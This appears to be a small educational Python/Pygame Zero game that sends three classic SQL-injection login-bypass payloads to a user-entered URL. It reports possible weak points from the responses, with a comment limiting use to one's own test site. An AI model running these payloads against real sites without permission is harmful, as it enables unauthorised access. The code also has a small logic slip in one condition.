import os
os.environ['SDL_VIDEO_WINDOW_POS'] = '100,100'
import random
import pgzrun
import pygame
import requests

pygame.mixer.music.load("song.mp3") #Eric Matyas
pygame.mixer.music.play(-1)


# Ziel-URL (nur eigene Testseite oder Übungsplattform!)
url = "http://localhost/index.html"
message=""
level=-2
machen=True

# Typische SQL-Injection-Payloads
payloads = [
    "' OR '1'='1",
    "' OR 'a'='a",
    "\" OR \"\" = \""
]

def draw():
    global level, url
    screen.clear()
    if level==-2:
        screen.blit("disclaimer",(0,0))
    if level == -1:
        screen.blit("title", (0, 0))
    elif level == 0:
        screen.blit("intro", (0, 0))
    elif level == 1:
        screen.blit("back", (0, 0))
        screen.draw.text("Website to test:", center=(400, 130), fontsize=24, color=(25, 0, 55))
        screen.draw.text(url, center=(400, 180), fontsize=24, color=(55, 55, 0))
    elif level == 2:
        screen.blit("back",(0,0))
        screen.draw.text(message, center=(400, 130), fontsize=24, color=(25, 0, 55))

def test():
    global url,message
    for p in payloads:
        data = {"username": p, "password": ""}  
        response = requests.post(url, data=data)
        if "Welcome" in response.text or "SQL error" in response.text:
            message+=f"[!] Possible weak point with payload: {p}\n"
        else:
            message+=f"[-] No reaction at payload: {p}\n"

def on_key_down(key, unicode=None):
    global level, url
    if key==keys.ESCAPE:
        pygame.quit()
    if key == keys.BACKSPACE:
        url = ""
    elif key == keys.RETURN and level == 1:
        level = 2
    elif unicode and key != keys.RETURN and level==1:
        url += unicode

def update():
    global level,machen
    if (level == 0 or level==-2) and keyboard.RETURN:
        level +=1
    elif level -1 and keyboard.space:
        level = 0
    if level==2:
        if machen:
            test()
            machen=False
        if keyboard.space:
            level=-1

pgzrun.go()

